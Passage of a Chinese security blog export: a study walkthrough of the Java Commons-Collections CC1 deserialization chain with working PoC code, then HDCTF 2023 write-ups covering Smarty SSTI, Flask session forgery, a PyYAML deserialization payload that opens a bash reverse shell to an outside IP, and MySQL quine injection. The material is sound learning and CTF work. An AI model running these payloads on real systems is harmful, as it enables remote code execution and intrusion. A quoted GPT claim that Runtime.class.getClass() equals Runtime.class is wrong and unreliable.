valueTransformer.transform(value);//返回valueTransformer对应的transform方法 } 这里回想之前我们弹计算器用到的InvokerTransformer对象，只要想办法让valueTransformer等于InvokerTransformeru即可实现命令执行（调用任意类的任意方法） 但这里看代码发现该构造函数以及是checkSetValue方法是protected类型，也就是说只能内部（同一个包）去实例化调用，外部是不能访问的，那我们就需要找内部实例化的工具，这里往上查找，可以发现一个public的静态方法decorate方法 TransformedMap.decorate public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } 很明显，该方法调用了TransformedMap构造函数进行实例化，且是public，意味着我们可以直接调用，因此我们可以通过TransformedMap.decorate方法来实现调用任意类的任意方法 测试代码1 import com.sun.javafx.collections.MappingChange; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.invoke.MethodHandle; import java.lang.reflect.Method; import java.lang.reflect.InvocationTargetException; import javax.swing.text.html.ObjectView; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); //静态方法staic修饰，直接类名＋方法名调用 //把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的 Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, invokerTransformer); Class transformerMapClass = TransformedMap.class; //TransformedMap.class返回TransformedMap类的Class对象。我们可以使用这个Class对象来访问和操作TransformedMap类的相关信息。 Method checkSetValueMethod = transformerMapClass.getDeclaredMethod(\"checkSetValue\", Object.class); //使用transformedMapClass对象来获取TransformedMap类的checkSetValue方法。 //因为checkSetValue是peotected,所以需要使用etAccessible(true)改变其作用域,这样即使私有的方法,也可以访问调用了 checkSetValueMethod.setAccessible(true); //参数：1、调用方法的对象实例，2、要传递给方法的参数 checkSetValueMethod.invoke(decorateMap, r); } } 这里先理一下思路（先不管Map，HashMap的由来）首先我们是找到了调用了transform方法的类TransformedMap，接着我们进入该类继续分析，发现checkSetValue方法的valueTransformer.transform(value);调用与我们最开始的demo相同，只需要将valueTransformer替换为InvokerTransformer即可。 那既然我们想要调用checkSetValue方法，就需要看该方法所属类的构造函数了，接着分析其对应的构造函数发现存在对valueTransformer的赋值，这意味着valueTransformer我们可控了。但这时候发现都是protected的权限，这时候需要寻找内部是否存在实例化该类的方法，结果发现decorate静态方法，且为public权限，这意味着我们直接调用即可构造完整利用链 接下来就是寻找哪里调用了decorate方法，这里找到如下图的地方，但这个类是没用的（这里是文章说的，我还不懂，先往下分析） 既然找不到合适的，所以我们把目光再放回之前的 checkSetValue 方法，去找哪里调用了该方法。 这里我们同样查找用法(Alt+F7)，发现只有一个地方调用了checkSetValue方法： AbstractInputCheckedMapDecorator 类的 setValue AbstractInputCheckedMapDecorator.MapEntry.setValue 仔细观察也会发现，AbstractInputCheckedMapDecorator类为TransformedMap的父类 Entry代表的是Map中的一个键值对，而对Map中我们可以看到setValue方法，我们在对Map进行遍历的时候可以调用setValue这个方法 不过上面这个MapEntry类实际上是重写了setValue方法，看他继承的父类AbstractMapEntryDecorator，其中也含有setValue方法 而这个类又引入了Map.Entry接口，所以我们只需要进行常规的Map遍历，就可以调用setValue方法，然后水到渠成的调用checkSetValue方法 import com.sun.javafx.collections.MappingChange; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.invoke.MethodHandle; import java.lang.reflect.Method; import java.lang.reflect.InvocationTargetException; import javax.swing.text.html.ObjectView; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();//实例化一个HashMap map.put(\"key\", \"value\");//给map一个键值对，方便后续的遍历 Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, invokerTransformer); //用于遍历 decorateMap 中的每个 Entry 对象。在每次迭代中，将当前的 Entry 对象赋值给变量entry。每个 Entry 对象表示一个键值对，其中包括键和对应的值。 for (Map.Entry entry:decorateMap.entrySet()){//decorateMap是一个Map对象，entrySet() 方法返回一个包含 Map 中键值对（Entry）的集合。 entry.setValue(r);//调用setvalue方法，设置Entry对象的值为r } } } decorateMap 之前的东西和之前都一样，不再讲述，区别是我们这里遍历了 decorateMap 来触发 setValue 。（注意 map.put(“key”,“value”) ，要不然map里面没东西，后面进不去for循环） decorateMap 是 TransformedMap 类的，该类没有再实现 entrySet 方法，所以会调用父类的 entrySet 方法。故在for循环时会进入如下方法： 这里会先判断isSetValueChecking()，如果判断通过即可过得一个EntrySet实例，而我们的 isSetValueChecking() 是恒返回true的，所以也就无所谓，直接返回实例。 所以我们的 entry 在这里也是来自 AbstractInputCheckedMapDecorator 类的，所以后面才可以调到 setValue 方法。效果如下： protected boolean isSetValueChecking() { return true;//恒为true } 隔了一天了，再来梳理一下上述链子的思路： 首先我们在TransformedMap类下，想要调用的是checkSetValue方法（但是protected权限），接着我们想的是直接利用该类本身带有的decorate方法来实例化类，进一步调用checkSetValue方法，但对于decorate来讲，没能找到调用该方法的链子（发现走不通）。于是我们接着查看checkSetValue方法被谁调用过。 发现只有一个类调用了该方法：AbstractInputCheckedMapDecorator类下的setValue方法，仔细观察会发现该方法包含在一个MapEntry类中，且继承自父类AbstractMapEntryDecorator，我们跟踪该类会发现该类还实现了Map.Entry接口中的方法，我们先观察当前类，发现该类也含有一个setValue方法，这意味着AbstractInputCheckedMapDecorator类下的setValue是对AbstractMapEntryDecorator类中对应的方法的重写。 接着我们跟踪Map.Entry接口，会发现该接口中含有setValue方法，且以键值对的形式存在，这意味着如果我们对Map对象调用entrySet方法，进行遍历即可得到setValue方法，而该方法已经被重写过了，也就能完整的形成调用链 而对于上述有一个小问题：就是我们经过遍历得到的setValue方法，是被AbstractMapEntryDecorator类实现的，但是该类的子类 AbstractInputCheckedMapDecorator对其父类的setValue方法进行了重写，那这个时候调用的应该是父类的setValue还是子类的setValue方法呢？（这里给出GPT的答案） 通过 `entrySet()` 方法获取到的 `Map.Entry` 对象，调用的是具体条目对象的 `setValue()` 方法，而具体条目对象是实现类的实例。 如果具体条目对象的 `setValue()` 方法在子类中被重写（覆盖），那么通过 `entrySet()` 方法获取到的 `Map.Entry` 对象调用的就是子类中重写后的 `setValue()` 方法，而不是父类的方法。 这符合面向对象的多态性原则，即通过父类的引用调用子类的方法时，实际执行的是子类中重写后的方法。 例如，如果你使用的是 `HashMap` 类作为 `Map` 的实现类，并且在子类中有一个名为 `MyEntry` 的具体条目类，覆盖了 `setValue()` 方法，那么通过 `entrySet()` 方法获取到的 `Map.Entry` 对象调用的就是 `MyEntry` 类中重写后的 `setValue()` 方法。 总结来说，通过 `entrySet()` 方法获取到的 `Map.Entry` 对象调用的是具体条目对象的 `setValue()` 方法，如果该方法在子类中被重写，那么调用的就是子类中重写后的方法。 那我们接着分析，现如今找到了setValue方法，接下来就是继续看谁调用了该方法，并且可以被我们继续所利用构造出合适的链子 这里经过文章的分析，找到了AnnotationInvocationHandler类，且该类中还含有readObject方法 进一步观察代码会发现，其中的for语句已经完美的替换掉了我们上述遍历Map对象的处理 AnnotationInvocationHandler.readObject 这里我们找到了 AnnotationInvocationHandler 中的 readObject 方法，接下来跟着文章分析一下这段代码 //这是一个私有方法，用于反序列化对象。它接受一个 ObjectInputStream 类型的参数 s，用于读取对象的序列化数据。 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { //使用 ObjectInputStream 的 defaultReadObject() 方法从输入流中读取对象的默认数据。这是为了保证默认的反序列化行为。 s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly //这是一个自定义的类型，用于表示注解类型 AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. //使用 for 循环遍历 memberValues.entrySet()，将每个键值对赋值给memberValue for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); //根据成员名从memberTypes中获取对应的成员类型 Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists //获取当前循环迭代的值（成员值） Object value = memberValue.getValue(); //判断成员值是否与成员类型兼容 if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { //如果成员值不兼容，将会创建一个新的AnnotationTypeMismatchExceptionProxy对象，并将其设置为对应的成员值 memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); } } } } 可以看到这里再调用setValue前面还要经过两个判断，这里再看一下memberValues是如何传入的 如上图，这里看到是在构造函数中传入memberValues形参对应的值，这里可以知道memberValues是可控的，只需要在构造函数的时候传入memberValues即可。且这里的构造函数的修饰符是默认的 我们知道在 Java 中，如果在构造函数的定义中没有指定修饰符（如 public 、 private 、 protected 或者默认的包级私有），那么该构造函数将具有默认的包级私有访问修饰符。默认的包级私有访问修饰符意味着该构造函数可以在同一个包中的其他类中访问和调用，但在不同包中的类中是不可见的。 也就是说这个构造函数只能在sun.reflect.annotation包下被调用，如果我们想要在外部调用，就需要利用反射。这里结合前面，我们可以再次写出利用代码 测试代码2 import com.sun.javafx.collections.MappingChange; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.invoke.MethodHandle; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.lang.reflect.InvocationTargetException; import javax.swing.text.html.ObjectView; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"key\", \"value\"); Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, invokerTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Override.class, decorateMap); serialize(obj); //序列化 unserialize(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\"); //反序列化 } public static void serialize(Object object) throws Exception { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\")); oos.writeObject(object); } public static void unserialize(String filename) throws Exception { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); objectInputStream.readObject(); } } 但这里我们在运行之后，并没有弹出计算器 问题1 调试看看，断点设在AnnotationInvocationHandler.readObject()之前说的两个判断处：进行调试运行 在这里如果我们点击步过的话，会直接调到下面，说明我们没有进去if判断语句。这里判断memberType，但是我们的memberType正好为空。 memberType来自memberTypes，memberTypes来自annotationType，annotationType 来自 type （ annotationType = AnnotationType.getInstance(type); ） 而Type来自我们传入的构造函数的参数 我们这里的要求传入的注解参数，是要求有成员变量的，并且成员变量要和 map 里面的 key 对的上。 （ ! (memberType.isInstance(value) ） 但是我们之前使用的Override注解没有成员变量，所以不行 这里我们找到了SuppressWarnings注解，该注解有一个成员变量： 于是我们可以修改我们的代码：（这里暂时不知道为何要修改map这一处代码） 问题2 改完之后接着运行，发现报错，这里说找不到对应的exec方法，看到上述Runtime类的对象r也是灰色的 同时我们可以看到，readObject 方法里面 setValue 的参数的实例居然是写死的，根本没用办法利用 解决无法传入runtime的问题 在解决这个问题的时候，文章看的我很疑惑，我不理解他们如何找到的那些类，这里看了个b站的视频，有所收获，这里就先跟着文章走一波，走完之后在总体回顾一下选择这些类的思路。 这里找到文章所说类的原因大概率是前期准备的工作，我们可以直接拿出那两个关键类来分析一波 ChainedTransformer 我们对transForm方法继续看看谁调用了，这里找到上图的类发现很有趣的地方，首先这个类ChainedTransformer接受一个Transformer[]数组赋值给一个变量。 接着在transform方法中，接受一个Object对象，然后调用iTransformers数组中的每个元素（实际上代表着转换器），然后调用每个转换器的transform方法，传入Object对象，并将返回值更新为新的转换结果，供以后得iTransformers数组元素调用 至于我们会想到使用上述类的原因在于这里 如上图，这里的Runtime我们跟进一下就知道该类没有继承serialize接口，因此不能被反序列化，但如果我们跟进一下Runtime的原型Class。如下图，会发现该类含有Serializable接口，能进行反序列化 那我们需要先利用反射获取Class原型，payload如下 Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getMethod(\"getRuntime\", null); Runtime runtime = (Runtime) method.invoke(null,null); Method execMethod = clazz.getMethod(\"exec\", String.class); execMethod.invoke(runtime, \"calc\"); 现在我们结合transform方法来实现上述代码 // Class clazz = Class.forName(\"java.lang.Runtime\"); // Method method = clazz.getMethod(\"getRuntime\", null); // Runtime runtime = (Runtime) method.invoke(null,null); // Method execMethod = clazz.getMethod(\"exec\", String.class); // execMethod.invoke(runtime, \"calc\"); //第一段就是为了获取getRuntime方法 Method getRuntimeMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class); //第二段是为了执行getRuntime方法，获取Runtime对象 Runtime runtime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod); //通过Runtime对象执行exec方法 new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime); 上面代码写的时候很懵逼，也是看了视频加很多文章才大概懂了知道如何写，主要还是理解了InvokerTransformer构造函数以及transform方之间的联系，就比较好懂为何是上面这种写法了。 下面是对Runtime.class与Runtime.class.getClass方法之间区别的回答，但可以看到这两个没有区别。 是的，`Runtime.class` 和 `Runtime.class.getClass()` 的结果是相同的，它们都表示 `Runtime` 类的 `Class` 对象。 `Runtime.class` 是直接获取 `Runtime` 类的 `Class` 对象的表达式，它返回的是一个 `Class&lt;Runtime&gt;` 类型的对象，表示 `Runtime` 类的 `Class` 对象。 而 `Runtime.class.getClass()` 是对 `Runtime.class` 所表示的 `Class` 对象再次调用 `getClass()` 方法，它也返回的是一个 `Class&lt;Runtime&gt;` 类型的对象，表示 `Runtime` 类的 `Class` 对象的 `Class` 对象。 两者的结果是相同的，都是表示 `Runtime` 类的 `Class` 对象。无论是使用 `Runtime.class` 还是 `Runtime.class.getClass()`，都可以获取到相同的结果，用于反射、获取类信息等操作。 这里写了上述的代码之后，我们发现这样的嵌套执行创建参数太麻烦了，于是乎师傅们找到了可以完美整合我们上述代码的类，这里我们跟进看看 public ChainedTransformer(Transformer[] transformers) { super(); iTransformers = transformers; } /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } 这里虽然上述提到过，但为了回忆继续分析一遍，逻辑主要就是对传入的Transformer数组元素的遍历，从元素0开始，每调用一次 iTransformers[i].transform(object);得到的object都会被用于下个元素transform(object)的操作，如同流水线一般，上一次的结果当做下一次的开始。这样的话，我们就可以将上述代码这样修改 Transformer[] transformers = { new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class);//获取Runitme类的原型Class，以便反序列化 这个时候如果我们运行的话，会发现依旧报错，我们下一个断点，看看传参有什么问题。如下图看到传入checkSetValue方法的参数根本不是我们期待的Runtime，根本原因在于上述问题2提到的readObject入口点的setValue参数不可控，那我们再看看有什么类可以解决 ConstantTransformer 我们继续返回源头看看谁继承了Transformer类接口，如下图的ConstantTransformer类，我们发现他对transform的实现为，不论传入什么参数，都返回一个iConstant常量。那如果我们可以将iConstant常量赋值为Runtime对象，那就顺利解决链子的问题了 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws Exception { Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"value\", \"value\"); Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(SuppressWarnings.class, decorateMap); serialize(obj); //序列化 unserialize(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\"); //反序列化 } public static void serialize(Object object) throws Exception { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"D:\\\\JavaStudy\\\\JavaCC1\\\\src\\\\main\\\\java\\\\Cc1.ser\")); oos.writeObject(object); } public static void unserialize(String filename) throws Exception { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); objectInputStream.readObject(); } } 可以看到最终成功调用 重新分析链子 这里算是初步分析完了，但还是有点懵，接下来再重新梳理一遍思路，就从反序列化入口开始。 我们知道，如果一个类继承了serialize接口的时候，那在反序列化和序列化的时候，都会优先调用该类下重写的readObject与writeObject方法，如果该类下没有重写的话，就会调用java默认的readObject与writeObject方法。 如上图，我们能看到，在该链子的入口处，类下含有重写的readObject方法，接下来我们分析其for语句 //主要就是针对Map.Entry的用法，这里是对memberValues.entrySet进行遍历，并将得到的键值对赋值给memberValue for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) { //name就是键值对中的键 String name = memberValue.getKey(); //通过get函数获取name键对应的值，赋值给memberType。 Class&lt;?&gt; memberType = memberTypes.get(name); //判断上述获取的memberType值是否为空 if (memberType != null) { // i.e. member still exists //获取键对应的值 Object value = memberValue.getValue(); //如果value值不是memberType的实例，也不是ExceptionProxy的实例，则进入该if语句 if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { //调用memberValue其中的setValue方法 memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); } } } 根据我们构造的链子，这里的memberTypes代表的就是注解类型的实例，在这里是我们的：SuppressWarnings，而该类中只含有一个value方法，经过GPT的解释，我也理解了对于Map.Entry遍历的基础知识。 因为我们需要令memberType != null不成立，也就是memberType 不为空，如果我们选择的是常见的注解类型override是不行的，因为其中没有任何属性或者方法。但SuppressWarnings含有value方法，为了memberType不为空，我们需要在遍历之前写下该代码：map.put(\"value\", \"value\");后一个value值没有要求，但第一个value必须相同，因为当遍历的时候匹配到了该value键，就会去找对应的值（就是函数对应的内容，这里也就是value()）倘若不是value，他就找不到返回null。 这里对于第二个if语句，他会判断value的类型，但类型显然是注解类型的属性，肯定不是上述的两个类的实例，所以一定会进入if语句。这里会调用memberValue的serValue方法，而memberValue已经被我们赋值为decorateMap的Map实例了，我们可以跟进decorateMap去看看具体处理。 decorateMap是来自TransformedMap类，并且还是AbstractInputCheckedMapDecorator类的子类 Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, chainedTransformer); decorateMap来源是TransformedMap的构造函数，其中赋值了一个map实例，以及关键的chainedTransformer类，我们一个个分析 要知道这里的decorateMap调用了一个entrySet方法，但其所在TransformedMap类没有这个方法，因此会向父类找该方法，巧的是父类的确有该方法，而该方法返回的是一个包含Map.Entry对象的集合，而每个Map.Entry对象都表示Map中的一个键值对 至于为何我们一定要添加map.put(\"value\", \"value\");除了注释类型的原因之外，我们可以跟踪一下 上述这里又是调用map.entrySet方法，我们如果看一下map的来源就会发现，是来自父类的构造函数的map 可以看到这里的构造函数会判断map是否为空，因此我们必须先对map添加一个键值对。 接着我们返回到刚刚的对decorateMap的键值对的遍历，decorateMap属于TransformedMap类中的属性，但确实Map对象实例，这里说map.entrySet实际上调用的是父类的entrySet方法，而父类又继承了Map对象的接口，因此我们才能对Map对象遍历得到setValue方法，这里我们在遍历到setValue方法之后，如下图，他本应该调用该类下的setValue方法，但是该类的子类却重写了setValue方法，这意味着最终调用的是子类的setValue方法 如上图，该子类的又去调用了checkSetValue方法，这里注意是去用parent调用checkSetValue方法，而parent是AbstractInputCheckedMapDecorator对象实例，而由于AbstractInputCheckedMapDecorator虽然实现了checkSetValue方法，但子类重写了该方法，于是就会去子类中调用checkSetValue方法。我们进入到子类对应的方法 发现是用valueTransformer调用transform方法，而valueTransformer已经被我们赋值为chainedTransformer类对象实例，而该实例的值为如下： Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; 经过chainedTransformer实例中的transform方法，会对上述数组元素分别调用transform方法，目的就是构造出Runtime类实例，并最终调用它的exec方法。那这里还需要注意ConstantTransformer类的作用：因为这里是调用ConstantTransformer类的transform方法，该它的transform方法是不论传入什么参数，始终返回一个常量，而该常量就是构造函数时候传入的参数（在这里就是Runtime.class类对象） 我们可以看看为何要有这个类的存在，如下图，在反序列化入口点，这里的setValue参数明显不可控，我们想要的是传入Runtime类对象，进而可以调用exec，但如果我们使用代码：new ConstantTransformer(Runtime.class)，跟踪这条链子你会发现，最终的调用是这样的 如上两幅图，最终在先调用ConstantTransformer的transform方法时，也就是返回的第一个Object对象就是常量iConstant，这里已经被赋值为了Runtime.class，完美解决上述入口点参数不可控的问题。 至此回顾完上述链子 总结 这里总结一下链子 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map().setValue() TransformedMap.decorateMap ChainedTransformer.transformer() ConstantTransformer.transformer() InvokerTransformer.transformer() Method.getMethod getMethod.getRuntime InvokerTransformer.transformer() Method.invoke Runtime.getRuntime InvokerTransformer.transformer() Method.exec Runtime.getRuntime.exec 到这里算是完成Java反序列化的第一个链子了，总的来说，分析过程并不顺利，且基本是靠着文章过来的，没有自己的见解，并且也感受到了自身Java基础有亿点点薄弱（就知道个基础语法），根据师傅的建议，下去看看Java se等相关Java开发的教程，对整个代码布局和写法有个理解，不然分析的时候，完全得靠文章和GPT，进步肯定微弱。 只能说任重道远，接下来依旧是分析一些常见的Java反序列化链子，对Java反序列化有一个较深的理解。 参考文章 Java反序列化CommonsCollections篇(一) CC1链手写EXP JAVA安全初探(三):CC1链全分析 Java 反序列化之CC1链","tags":["Java反序列化"],"categories":["Java反序列化"]},{"title":"HDCTF","path":"/2024/03/18/hdctf/","content":"[HDCTF 2023]Welcome To HDCTF 2023 审js看到如上代码，下意识直接console.log输入即可 [HDCTF 2023]SearchMaster 访问composer.json泄露smarty 直接使用现成的payload即可，ssti smarty可参考：Smarty模板引擎漏洞详解 data={system(‘cat /flag_13_searchmaster’)} [HDCTF 2023]YamiYami 这里的ssrf地方可以进行文件读取，但是当读取app\\app.py的时候被过滤了，看了wp发现二次url编码即可 #encoding:utf-8 import os import re, random, uuid from flask import * from werkzeug.utils import * import yaml from urllib.request import urlopen app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) app.debug = False BLACK_LIST=[\"yaml\",\"YAML\",\"YML\",\"yml\",\"yamiyami\"] app.config['UPLOAD_FOLDER']=\"/app/uploads\" @app.route('/') def index(): session['passport'] = 'YamiYami' return ''' Welcome to HDCTF2023 &lt;a href=\"/read?url=https://baidu.com\"&gt;Read somethings&lt;/a&gt; &lt;br&gt; Here is the challenge &lt;a href=\"/upload\"&gt;Upload file&lt;/a&gt; &lt;br&gt; Enjoy it &lt;a href=\"/pwd\"&gt;pwd&lt;/a&gt; ''' @app.route('/pwd') def pwd(): return str(pwdpath) @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('app.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m: return \"re.findall('app.*', url, re.IGNORECASE)\" if n: return \"re.findall('flag', url, re.IGNORECASE)\" res = urlopen(url) return res.read() except Exception as ex: print(str(ex)) return 'no response' def allowed_file(filename): for blackstr in BLACK_LIST: if blackstr in filename: return False return True @app.route('/upload', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': if 'file' not in request.files: flash('No file part') return redirect(request.url) file = request.files['file'] if file.filename == '': return \"Empty file\" if file and allowed_file(file.filename): filename = secure_filename(file.filename) if not os.path.exists('./uploads/'): os.makedirs('./uploads/') file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)) return \"upload successfully!\" return render_template(\"index.html\") @app.route('/boogipop') def load(): if session.get(\"passport\")==\"Welcome To HDCTF2023\": LoadedFile=request.args.get(\"file\") if not os.path.exists(LoadedFile): return \"file not exists\" with open(LoadedFile) as f: yaml.full_load(f) f.close() return \"van you see\" else: return \"No Auth bro\" if __name__=='__main__': pwdpath = os.popen(\"pwd\").read() app.run( debug=False, host=\"0.0.0.0\" ) print(app.config['SECRET_KEY']) 上述代码，主要是看/boogipop路由的处理，当我们的session正确的话，就将我们对file参数指定的文件加载出来，而这里使用了full_load函数，可以造成反序列化，我们只需要绕过黑名单即可。 这里的上传黑名单禁掉了Yaml等，这其实是一个难点。但是上传txt文件也能被解析成Yaml。原因在于，只要文件的内容确实符合 YAML 数据格式，你仍然可以尝试将其解析为 YAML 数据。 首先就是获取session_key //读取file:///sys/class/net/eth0/address 02:42:ac:02:1b:ed-》0242ac021bed-》2485376916461 得到十六进制即可，接下来生成key import random random.seed(0x0242ac021bed) print(str(random.random()*233)) #得到158.50325024906226 接下来伪造session eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.Zf7jvw.hude4V5Px2U7rOmeFZ2HKQMO9Tc 接下来构造yaml文件进行反序列化，这里采用反弹shell - !!python/object/new:str args: [] state: !!python/tuple - \"__import__('os').system('bash -c \\\"bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1\\\"')\" - !!python/object/new:staticmethod args: [0] state: update: !!python/name:exec 之后直接上传文件，随后bp抓包修改session，然后读取指定文件，即可拿到shell 参考文章 [HDCTF 2023]YamiYami [HDCTF 2023]LoginMaster 这道题遇到了新知识点：quine注入（输入输出一致，绕过限制登录） Quine注入 首先了解一波关于Quine注入的知识 replace()函数： replace(a,b,c) 把a中的b换成c //如 replace('abb','b','c') -&gt; acc mysql&gt; select ascii('.'); +------------+ | ascii('.') | +------------+ | 46 | +------------+ 1 row in set (0.02 sec) mysql&gt; select replace(\".\",chr(46),\".\"); 1305 - FUNCTION security.chr does not exist mysql&gt; select replace(\".\",char(46),\".\"); +---------------------------+ | replace(\".\",char(46),\".\") | +---------------------------+ | . | +---------------------------+ 1 row in set (0.02 sec) 这里可以看到我们已经看到了输入与输出一样的原型了，继续往下构造 mysql&gt; select replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")'); +---------------------------------------------------------------------------+ | replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') | +---------------------------------------------------------------------------+ | replace(\"replace(\".\",char(46),\".\")\",char(46),\"replace(\".\",char(46),\".\")\") | +---------------------------------------------------------------------------+ 1 row in set (0.02 sec) 可以看到这里套娃成功，这里的意思就是把字符串replace(\".\",char(46),\".\")中的符号 . 替换为字符串replace(\".\",char(46),\".\")，因此最终会发现替换之后跟原来的输出基本一致。不通电就在于字符串replace(\".\",char(46),\".\")两边：原型是被单引号包裹，而输出结果是双引号，这意味着输入输出还没有一致，我们还需要想办法将双引号替换为单引号 我们看一下单双引号的ASCII码 mysql&gt; select ascii('\"'); +------------+ | ascii('\"') | +------------+ | 34 | +------------+ 1 row in set (0.03 sec) mysql&gt; select ascii(\"'\"); +------------+ | ascii(\"'\") | +------------+ | 39 | +------------+ 1 row in set (0.03 sec) 那如果我们在嵌入一套replace会如何呢 mysql&gt; select replace(replace('\".\"',char(34),char(39)),char(46),\".\"); +--------------------------------------------------------+ | replace(replace('\".\"',char(34),char(39)),char(46),\".\") | +--------------------------------------------------------+ | '.' | +--------------------------------------------------------+ 1 row in set (0.03 sec) 可以看到这样的话，字符串两段就变成了单引号包裹。按照这种思路，我们可以这样构造 select replace('replace(\".\",char(46),\".\")',char(34),char(39)); //replace('.',char(46),'.') select replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') mysql&gt; select 